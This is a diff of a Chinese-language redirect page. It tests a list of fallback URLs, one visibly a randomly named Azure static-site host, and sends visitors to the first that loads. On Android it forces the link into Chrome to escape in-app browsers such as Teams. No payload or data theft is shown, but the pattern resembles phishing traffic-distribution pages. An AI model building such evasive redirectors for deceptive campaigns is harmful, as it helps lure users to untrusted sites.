@@ -1,59 +1,40 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>系统跳转中...</title>
+  <meta charset="UTF-8">
+  <title>跳转中...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
       margin: 0;
-      padding: 0;
-      background-color: #f4f7fb;
-      color: #333;
-      font-family: "Segoe UI", Roboto, sans-serif;
+      background: #f9f9f9;
+      font-family: sans-serif;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      color: #555;
+    }
+    .message {
       text-align: center;
-    }
-    #message {
-      font-size: 18px;
-      margin-top: 20px;
-      opacity: 0;
-      animation: fadeIn 0.8s ease-in-out forwards;
-    }
-    button {
-      padding: 10px 24px;
-      font-size: 16px;
-      border: none;
-      border-radius: 8px;
-      background-color: #0078d4;
-      color: white;
-      cursor: pointer;
-      margin-top: 24px;
       display: none;
     }
-    .icon {
-      width: 80px;
-      height: 80px;
-      opacity: 0.7;
+    .loading {
+      font-size: 18px;
     }
-    @keyframes fadeIn {
-      to { opacity: 1; }
+    .fail {
+      color: #d00;
     }
   </style>
 </head>
 <body>
+  <div class="message" id="loadingMsg">
+    <div class="loading">正在跳转，请稍候...</div>
+  </div>
 
-  <svg class="icon" viewBox="0 0 24 24" fill="none" id="icon">
-    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10
-             10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
-          fill="#0078d4"/>
-  </svg>
-  <div id="message">正在进入系统，请稍候...</div>
-  <button id="retryBtn" onclick="manualJump()">点击进入系统</button>
+  <div class="message fail" id="failMsg">
+    <div>项目维护中，请稍后再试。</div>
+  </div>
 
   <script>
     const urls = [
@@ -63,85 +44,43 @@
       "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
     ];
 
-    const timeout = 4000;
-    let validUrl = null;
+    const isAndroid = /android/i.test(navigator.userAgent);
+    const loadingMsg = document.getElementById("loadingMsg");
+    const failMsg = document.getElementById("failMsg");
 
-    function tryUrl(url, onSuccess, onFailure) {
-      const iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      iframe.src = url;
-      document.body.appendChild(iframe);
+    loadingMsg.style.display = "block";
 
-      const timer = setTimeout(() => {
-        document.body.removeChild(iframe);
-        onFailure();
-      }, timeout);
+    let loaded = false;
 
-      iframe.onload = () => {
-        clearTimeout(timer);
-        document.body.removeChild(iframe);
-        onSuccess(url);
-      };
-    }
-
-    function tryNext(index) {
-      if (index >= urls.length) {
-        showFailUI();
+    function testUrl(urlIndex) {
+      if (urlIndex >= urls.length) {
+        loadingMsg.style.display = "none";
+        failMsg.style.display = "block";
         return;
       }
 
-      tryUrl(
-        urls[index],
-        (url) => {
-          validUrl = url;
-          autoJump(url);
-        },
-        () => {
-          tryNext(index + 1);
+      const img = new Image();
+      const url = urls[urlIndex];
+      img.onload = () => {
+        if (loaded) return;
+        loaded = true;
+
+        // ✅ Android 强制使用 Chrome 打开外部链接
+        if (isAndroid) {
+          window.location.href =
+            `intent://${url.replace(/^https?:\/\//, "")}#Intent;scheme=https;package=com.android.chrome;end`;
+        } else {
+          window.location.href = url;
         }
-      );
+      };
+      img.onerror = () => testUrl(urlIndex + 1);
+
+      // 触发加载
+      img.src = url + "?t=" + Date.now();
     }
 
-    function autoJump(url) {
-      try {
-        // 有些安卓 Teams 会拦截自动跳转，需要 fallback
-        window.location.href = url;
-
-        // 2秒后检查是否跳转成功，如果没跳就提示用户点击
-        setTimeout(() => {
-          if (!document.hidden) {
-            // 页面还在 → 跳转失败
-            showManualJumpUI();
-          }
-        }, 2000);
-      } catch {
-        showManualJumpUI();
-      }
-    }
-
-    function showManualJumpUI() {
-      document.getElementById("message").innerText = "请点击按钮进入系统";
-      document.getElementById("retryBtn").style.display = "inline-block";
-    }
-
-    function showFailUI() {
-      document.getElementById("icon").innerHTML = `
-        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z" fill="#D13438"/>`;
-      document.getElementById("message").innerText = "系统维护中，请稍后再试。";
-    }
-
-    function manualJump() {
-      if (validUrl) {
-        window.location.href = validUrl;
-      } else {
-        document.getElementById("message").innerText = "未找到可用地址，请刷新页面。";
-      }
-    }
-
-    window.onload = () => {
-      tryNext(0);
-    };
+    // 延迟一点点再开始测试，以防白屏
+    setTimeout(() => testUrl(0), 300);
   </script>
-
 </body>
 </html>
